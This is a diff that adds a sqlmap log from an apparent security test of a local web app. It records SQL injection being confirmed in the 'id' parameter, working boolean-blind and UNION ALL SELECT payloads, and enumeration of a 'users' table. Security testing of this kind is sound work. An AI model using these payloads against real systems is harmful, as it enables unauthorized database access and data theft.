@@ -1,0 +1,69 @@
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.8.4#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:25:28 /2026-11-07/
+
+[18:25:28] [WARNING] using '/opt/ares/security_reports/timedemo_20261107T172524Z/sqlmap' as the output directory
+[1/1] URL:
+GET http://127.0.0.1:8099/user?id=1
+do you want to test this URL? [Y/n/q]
+> Y
+[18:25:28] [INFO] testing URL 'http://127.0.0.1:8099/user?id=1'
+[18:25:28] [INFO] using '/opt/ares/security_reports/timedemo_20261107T172524Z/sqlmap/results-11072026_0625pm.csv' as the CSV results file in multiple targets mode
+[18:25:28] [INFO] testing connection to the target URL
+[18:25:28] [INFO] checking if the target is protected by some kind of WAF/IPS
+[18:25:28] [INFO] testing if the target URL content is stable
+[18:25:28] [INFO] target URL content is stable
+[18:25:28] [INFO] testing if GET parameter 'id' is dynamic
+[18:25:28] [INFO] GET parameter 'id' appears to be dynamic
+[18:25:28] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[18:25:28] [INFO] testing for SQL injection on GET parameter 'id'
+[18:25:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[18:25:28] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[18:25:29] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (3) and risk (2) values? [Y/n] Y
+[18:25:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[18:25:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[18:25:29] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[18:25:29] [INFO] target URL appears to have 3 columns in query
+[18:25:29] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[18:25:29] [WARNING] applying generic concatenation (CONCAT)
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 8758=8758
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(113,120,118,118,113)||CHAR(101,104,86,81,86,115,69,66,88,115,112,102,67,82,107,97,77,78,104,67,65,87,72,73,117,82,117,111,68,86,111,69,79,77,112,106,69,105,84,65)||CHAR(113,122,112,113,113)-- hYtu
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[18:25:29] [INFO] testing SQLite
+[18:25:29] [INFO] confirming SQLite
+[18:25:29] [INFO] actively fingerprinting SQLite
+[18:25:29] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[18:25:29] [INFO] fetching tables for database: 'SQLite_masterdb'
+<current>
+[1 table]
++-------+
+| users |
++-------+
+
+[18:25:29] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 38 times
+[18:25:29] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/opt/ares/security_reports/timedemo_20261107T172524Z/sqlmap/results-11072026_0625pm.csv'
+[18:25:29] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 18:25:29 /2026-11-07/
+
